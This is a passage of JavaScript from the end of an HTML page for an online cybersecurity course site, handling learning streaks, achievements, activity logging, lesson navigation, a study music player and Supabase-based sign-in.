            .eq("id", currentUser.id)
            .single();

          if (error) throw error;

          const now = new Date();
          const today = now.toDateString();
          const lastActivity = profile.last_activity
            ? new Date(profile.last_activity)
            : null;
          const lastStreakDate = profile.last_streak_date
            ? new Date(profile.last_streak_date).toDateString()
            : null;

          let newStreak = profile.current_streak || 0;
          let shouldUpdateStreak = false;

          if (!lastActivity) {
            // First time user
            newStreak = 1;
            shouldUpdateStreak = true;
          } else {
            const daysSinceLastActivity = Math.floor(
              (now - lastActivity) / (1000 * 60 * 60 * 24)
            );

            if (lastStreakDate === today) {
              // Already counted today's streak
              return newStreak;
            } else if (
              daysSinceLastActivity === 1 ||
              (daysSinceLastActivity === 0 && lastStreakDate !== today)
            ) {
              // Consecutive day or same day but not counted yet
              newStreak += 1;
              shouldUpdateStreak = true;
            } else if (daysSinceLastActivity > 1) {
              // Streak broken
              newStreak = 1;
              shouldUpdateStreak = true;
            }
          }

          if (shouldUpdateStreak) {
            await supabase
              .from("profiles")
              .update({
                current_streak: newStreak,
                last_activity: now.toISOString(),
                last_streak_date: now.toISOString(),
              })
              .eq("id", currentUser.id);

            userStats.current_streak = newStreak;

            showToast(`Daily streak: ${newStreak} days!`, "success");
            await checkStreakAchievements(newStreak);
          }

          return newStreak;
        } catch (error) {
          console.error("Error checking daily streak:", error);
          return 0;
        }
      }

      async function checkStreakAchievements(currentStreak) {
        const streakMilestones = [3, 7, 14, 30, 100, 365];

        for (const milestone of streakMilestones) {
          if (currentStreak >= milestone) {
            await checkAndUnlockAchievement(`streak_${milestone}`);
          }
        }
      }

      // =====================================================
      // USER ACTIVITY LOGGING
      // =====================================================
      async function logUserActivity(activityType, metadata = {}) {
        try {
          const now = new Date();

          const activityData = {
            user_id: currentUser.id,
            activity_type: activityType,
            timestamp: now.toISOString(),
            course_id: COURSE_DATA.id,
            lesson_index: currentLessonIndex,
            session_duration: courseSession.totalStudyTime,
            metadata: JSON.stringify(metadata),
            created_at: now.toISOString(),
          };

          // Try to log to activities table
          const { error } = await supabase
            .from("user_activities")
            .insert([activityData]);

          if (error && error.code !== "42P01") {
            console.warn("Activity logging failed:", error.message);
          }

          // Always update last activity in profile
          await supabase
            .from("profiles")
            .update({ last_activity: now.toISOString() })
            .eq("id", currentUser.id);
        } catch (error) {
          console.error("Error logging user activity:", error);
        }
      }

      // =====================================================
      // NAVIGATION SYSTEM
      // =====================================================
      function updateNavigationButtons() {
        const prevBtn = document.getElementById("prevLessonBtn");
        const nextBtn = document.getElementById("nextLessonBtn");

        if (!prevBtn || !nextBtn) return;

        // Previous button
        prevBtn.disabled = currentLessonIndex === 0;

        // Next button logic
        const isLastLesson =
          currentLessonIndex === COURSE_DATA.lessons.length - 1;
        const canGoNext =
          currentLessonIndex < COURSE_DATA.lessons.length - 1 &&
          canAccessLesson(currentLessonIndex + 1);

        if (isLastLesson) {
          const isCurrentCompleted =
            courseProgress[COURSE_DATA.lessons[currentLessonIndex].id]
              ?.completed;
          nextBtn.disabled = !isCurrentCompleted;
          nextBtn.innerHTML = '<i class="fas fa-trophy"></i> Complete Course';
        } else {
          nextBtn.disabled = !canGoNext;
          nextBtn.innerHTML = 'Next <i class="fas fa-chevron-right"></i>';
        }
      }

      // Navigation button event handlers
      function goToPreviousLesson() {
        if (currentLessonIndex > 0) {
          trackLessonTime(); // Track time spent on current lesson
          currentLessonIndex--;
          loadLesson(currentLessonIndex);
        }
      }

      function goToNextLesson() {
        if (currentLessonIndex < COURSE_DATA.lessons.length - 1) {
          const canGoNext = canAccessLesson(currentLessonIndex + 1);
          if (canGoNext) {
            trackLessonTime();
            currentLessonIndex++;
            loadLesson(currentLessonIndex);
          } else {
            showToast("Complete the current lesson quiz to proceed", "warning");
          }
        } else {
          // Complete course
          completeCourse();
        }
      }

      // =====================================================
      // SIDEBAR FUNCTIONS
      // =====================================================
      function toggleSidebar() {
        const sidebar = document.getElementById("sidebar");
        const overlay = document.getElementById("sidebarOverlay");

        if (sidebar) sidebar.classList.toggle("open");
        if (overlay) overlay.classList.toggle("active");
      }

      function closeSidebar() {
        const sidebar = document.getElementById("sidebar");
        const overlay = document.getElementById("sidebarOverlay");

        if (sidebar) sidebar.classList.remove("open");
        if (overlay) overlay.classList.remove("active");
      }

      // =====================================================
      // ACHIEVEMENT NOTIFICATION SYSTEM
      // =====================================================
      function queueAchievementNotification(achievement) {
        notificationQueue.push(achievement);
        processNotificationQueue();
      }

      function processNotificationQueue() {
        if (isShowingNotification || notificationQueue.length === 0) return;

        isShowingNotification = true;
        const achievement = notificationQueue.shift();
        showAchievementNotification(achievement);

        const duration =
          achievement.rarity === "mythic"
            ? 8000
            : achievement.rarity === "legendary"
            ? 7000
            : 6000;

        setTimeout(() => {
          isShowingNotification = false;
          processNotificationQueue();
        }, duration + 500);
      }

      function showAchievementNotification(achievement) {
        const notification = document.getElementById("achievementNotification");
        if (!notification) return;

        const icon = document.getElementById("notificationIcon");
        const title = document.getElementById("notificationTitle");
        const description = document.getElementById("notificationDescription");
        const points = document.getElementById("notificationPoints");

        if (icon) {
          icon.innerHTML = `<i class="${achievement.icon}"></i>`;
          icon.className = `notification-icon ${achievement.rarity}`;
        }
        if (title) title.textContent = achievement.name;
        if (description) description.textContent = achievement.description;
        if (points) points.textContent = `+${achievement.points} Points`;

        notification.className = `achievement-notification ${achievement.rarity}`;
        notification.classList.add("show");

        const duration =
          achievement.rarity === "mythic"
            ? 8000
            : achievement.rarity === "legendary"
            ? 7000
            : 6000;

        setTimeout(() => {
          notification.classList.remove("show");
        }, duration);
      }

      // =====================================================
      // UTILITY FUNCTIONS
      // =====================================================
      function calculateAverageQuizScore() {
        const scores = Object.values(courseProgress)
          .filter((p) => p.completed && p.quizScore)
          .map((p) => p.quizScore);

        if (scores.length === 0) return 0;
        return Math.round(
          scores.reduce((sum, score) => sum + score, 0) / scores.length
        );
      }

      async function resetProgress() {
        if (
          !confirm(
            "Are you sure you want to reset your progress? This action cannot be undone."
          )
        ) {
          return;
        }

        try {
          // Track lesson time before reset
          trackLessonTime();

          // Reset local state
          courseProgress = {};
          currentLessonIndex = 0;
          courseSession = {
            startTime: new Date(),
            totalStudyTime: 0,
            lessonsStarted: 0,
            lessonsCompleted: 0,
            pageLoadTime: new Date(),
            interactionCount: 0,
            lastActivityTime: new Date(),
          };

          // Delete from database
          await supabase
            .from("course_progress")
            .delete()
            .eq("user_id", currentUser.id)
            .eq("course_id", COURSE_DATA.id);

          // Log reset activity
          logUserActivity("progress_reset", {
            course_id: COURSE_DATA.id,
            reset_reason: "manual",
          });

          // Reinitialize
          await saveProgress();
          renderSidebar();
          loadLesson(0);

          showToast("Progress reset successfully", "success");
        } catch (error) {
          console.error("Error resetting progress:", error);
          showToast("Failed to reset progress", "error");
        }
      }

      function copyCode(codeId) {
        const codeElement = document.getElementById(codeId);
        if (!codeElement) return;

        const text = codeElement.textContent;

        navigator.clipboard
          .writeText(text)
          .then(() => {
            showToast("Code copied to clipboard!", "success");

            // Track code copy for achievements
            logUserActivity("code_copied", {
              code_section: codeId,
              lesson_id: COURSE_DATA.lessons[currentLessonIndex].id,
            });
          })
          .catch((err) => {
            console.error("Failed to copy code:", err);
            showToast("Failed to copy code", "error");

            // Fallback for older browsers
            const textArea = document.createElement("textarea");
            textArea.value = text;
            document.body.appendChild(textArea);
            textArea.select();
            try {
              document.execCommand("copy");
              showToast("Code copied to clipboard!", "success");
            } catch (fallbackError) {
              showToast(
                "Copy failed - please select and copy manually",
                "error"
              );
            }
            document.body.removeChild(textArea);
          });
      }

      function escapeHtml(text) {
        const div = document.createElement("div");
        div.textContent = text;
        return div.innerHTML;
      }

      // =====================================================
      // UI FEEDBACK SYSTEMS
      // =====================================================
      function showToast(message, type = "success") {
        const toast = document.getElementById("toast");
        const messageEl = document.getElementById("toastMessage");

        if (!toast || !messageEl) {
          console.log(`Toast: ${message} (${type})`);
          return;
        }

        messageEl.textContent = message;
        toast.className = `toast ${type} show`;

        setTimeout(() => {
          toast.classList.remove("show");
        }, 4000);
      }

      function showLoadingScreen() {
        const loadingScreen = document.getElementById("loadingScreen");
        if (loadingScreen) loadingScreen.classList.remove("hidden");
      }

      function hideLoadingScreen() {
        const loadingScreen = document.getElementById("loadingScreen");
        if (loadingScreen) {
          setTimeout(() => {
            loadingScreen.classList.add("hidden");
          }, 1000);
        }
      }

      // =====================================================
      // MUSIC PLAYER INTEGRATION
      // =====================================================
      function initMusicPlayer() {
        const btnText = document.getElementById("music-button-text");
        const icon = document.getElementById("music-icon");
        const dropdown = document.getElementById("music-dropdown-content");

        if (!btnText || !icon || !dropdown) return;

        function setUI(state) {
          btnText.textContent =
            state === "Playing" ? "PAUSE MUSIC" : "STUDY MUSIC";
          icon.className =
            state === "Playing"
              ? "fa-solid fa-circle-pause"
              : "fa-solid fa-music";
        }

        // Load saved music state
        const savedSrc = localStorage.getItem("cybersec_music_src");
        const savedTime = parseFloat(
          localStorage.getItem("cybersec_music_time") || 0
        );

        if (savedSrc) {
          audioPlayer.src = savedSrc;
          audioPlayer.currentTime = savedTime;
          audioPlayer
            .play()
            .then(() => setUI("Playing"))
            .catch(() => setUI("Stopped"));
        }

        // Music button click handler
        document
          .getElementById("music-dropdown")
          .querySelector("button")
          .addEventListener("click", (e) => {
            e.stopPropagation();
            dropdown.style.display =
              dropdown.style.display === "block" ? "none" : "block";

            if (audioPlayer.src && !audioPlayer.paused) {
              audioPlayer.pause();
              setUI("Stopped");
            } else if (audioPlayer.src) {
              audioPlayer.play().then(() => setUI("Playing"));
            }
          });

        // Music selection handlers
        dropdown.querySelectorAll("a[data-src]").forEach((link) => {
          link.addEventListener("click", (e) => {
            e.preventDefault();
            audioPlayer.src = link.dataset.src;
            audioPlayer.play().then(() => setUI("Playing"));
            localStorage.setItem("cybersec_music_src", link.dataset.src);
            dropdown.style.display = "none";
          });
        });

        // Stop music handler
        const stopLink = document.getElementById("stop-music-link");
        if (stopLink) {
          stopLink.addEventListener("click", (e) => {
            e.preventDefault();
            audioPlayer.pause();
            audioPlayer.currentTime = 0;
            audioPlayer.removeAttribute("src");
            setUI("Stopped");
            localStorage.removeItem("cybersec_music_src");
            localStorage.removeItem("cybersec_music_time");
            dropdown.style.display = "none";
          });
        }

        // Save music state before page unload
        window.addEventListener("beforeunload", () => {
          if (!audioPlayer.paused && audioPlayer.src) {
            localStorage.setItem("cybersec_music_src", audioPlayer.src);
            localStorage.setItem(
              "cybersec_music_time",
              audioPlayer.currentTime
            );
          }
        });

        // Close dropdown when clicking outside
        window.addEventListener("click", (e) => {
          if (!e.target.closest("#music-dropdown")) {
            dropdown.style.display = "none";
          }
        });
      }

      // Show initial music indicator
      function addMusicIndicator() {
        const musicBtn = document.querySelector("#music-dropdown");
        if (musicBtn) {
          const indicator = document.createElement("div");
          indicator.className = "music-indicator";
          indicator.innerHTML = `<i class="fa-solid fa-music"></i> Try Study Music!`;

          musicBtn.style.position = "relative";
          musicBtn.appendChild(indicator);

          setTimeout(() => indicator.remove(), 3000);
        }
      }

      // Initialize Event Listeners
      function initializeEventListeners() {
        // Navigation buttons
        document
          .getElementById("prevLessonBtn")
          ?.addEventListener("click", goToPreviousLesson);
        document
          .getElementById("nextLessonBtn")
          ?.addEventListener("click", goToNextLesson);

        // Reset progress button
        document
          .getElementById("resetProgressBtn")
          ?.addEventListener("click", resetProgress);

        // Mobile menu toggle
        document
          .getElementById("menuToggle")
          ?.addEventListener("click", toggleSidebar);
        document
          .getElementById("sidebarOverlay")
          ?.addEventListener("click", closeSidebar);

        // Keyboard shortcuts
        document.addEventListener("keydown", handleKeyboardShortcuts);

        // Window resize handler
        window.addEventListener("resize", handleWindowResize);

        // Content interaction tracking
        document.getElementById("contentBody")?.addEventListener(
          "scroll",
          debounce(() => {
            trackUserInteraction();
          }, 1000)
        );
      }

      // Keyboard Shortcuts
      function handleKeyboardShortcuts(e) {
        if (document.querySelector(".quiz-question.active")) return;

        if (e.key === "ArrowLeft" && e.ctrlKey) {
          e.preventDefault();
          goToPreviousLesson();
        } else if (e.key === "ArrowRight" && e.ctrlKey) {
          e.preventDefault();
          goToNextLesson();
        }
      }

      // Window Resize Handler
      function handleWindowResize() {
        if (window.innerWidth > 768) {
          closeSidebar();
        }
      }

      // Debounce Helper
      function debounce(func, wait) {
        let timeout;
        return function executedFunction(...args) {
          const later = () => {
            clearTimeout(timeout);
            func(...args);
          };
          clearTimeout(timeout);
          timeout = setTimeout(later, wait);
        };
      }

      // Initialize responsive behavior
      if (window.innerWidth <= 768) {
        document.getElementById("menuToggle").style.display = "inline-flex";
      }

      // Auto-save progress periodically
      setInterval(async () => {
        if (currentUser && Object.keys(courseProgress).length > 0) {
          await saveProgress();
        }
      }, 60000); // Save every minute

      // System initialization logging
      console.log("CyberSec Academy Course System Initialized");
      console.log("Current Course:", COURSE_DATA.title);
      console.log("Total Lessons:", COURSE_DATA.lessons.length);

      // Google OAuth Integration
      const googleBtn = document.querySelector(".btn-google");
      if (googleBtn) {
        googleBtn.addEventListener("click", async () => {
          const { data, error } = await supabase.auth.signInWithOAuth({
            provider: "google",
            options: {
              redirectTo:
                window.location.origin +
                "/courses/bypass-security-controls.html",
            },
          });

          if (error) {
            console.error("Google login error:", error.message);
            showToast("Google login failed: " + error.message, "error");
          }
        });
      }

      // Check for existing session
      supabase.auth.getSession().then(({ data }) => {
        if (data.session) {
          console.log("User already logged in:", data.session.user);
          currentUser = data.session.user;
          startCourseSession();
        }
      });

      // Add missing auth modal functions
      function openAuthModal() {
        const modal = document.getElementById("authModal");
        if (modal) {
          modal.style.display = "flex";
        }
      }

      function closeAuthModal() {
        const modal = document.getElementById("authModal");
        if (modal) {
          modal.style.display = "none";
        }
      }

      // Add auth tab switching functionality
      document.getElementById("tabSignIn")?.addEventListener("click", () => {
        document.getElementById("tabSignIn").classList.add("active");
        document.getElementById("tabSignUp").classList.remove("active");
        document.getElementById("signInForm").style.display = "block";
        document.getElementById("signUpForm").style.display = "none";
      });

      document.getElementById("tabSignUp")?.addEventListener("click", () => {
        document.getElementById("tabSignUp").classList.add("active");
        document.getElementById("tabSignIn").classList.remove("active");
        document.getElementById("signUpForm").style.display = "block";
        document.getElementById("signInForm").style.display = "none";
      });

      document
        .getElementById("closeAuthModal")
        ?.addEventListener("click", closeAuthModal);

      // Improved error handling for auth session
      supabase.auth.onAuthStateChange((event, session) => {
        if (event === "SIGNED_IN") {
          currentUser = session.user;
          closeAuthModal();
          startCourseSession();
        } else if (event === "SIGNED_OUT") {
          currentUser = null;
          openAuthModal();
        }
      });

      // Add form submission handlers
      document
        .getElementById("emailSignInForm")
        ?.addEventListener("submit", async (e) => {
          e.preventDefault();
          const email = document.getElementById("signInEmail").value;
          const password = document.getElementById("signInPassword").value;

          try {
            const { data, error } = await supabase.auth.signInWithPassword({
              email,
              password,
            });

            if (error) throw error;

            closeAuthModal();
          } catch (error) {
            showToast(error.message, "error");
          }
        });

      document
        .getElementById("emailSignUpForm")
        ?.addEventListener("submit", async (e) => {
          e.preventDefault();
          const email = document.getElementById("signUpEmail").value;
          const password = document.getElementById("signUpPassword").value;
          const name = document.getElementById("signUpName").value;

          try {
            const { data, error } = await supabase.auth.signUp({
              email,
              password,
              options: {
                data: {
                  full_name: name,
                },
              },
            });

            if (error) throw error;

            showToast(
              "Account created successfully! Please check your email.",
              "success"
            );
          } catch (error) {
            showToast(error.message, "error");
          }
        });
    </script>
  </body>
</html>

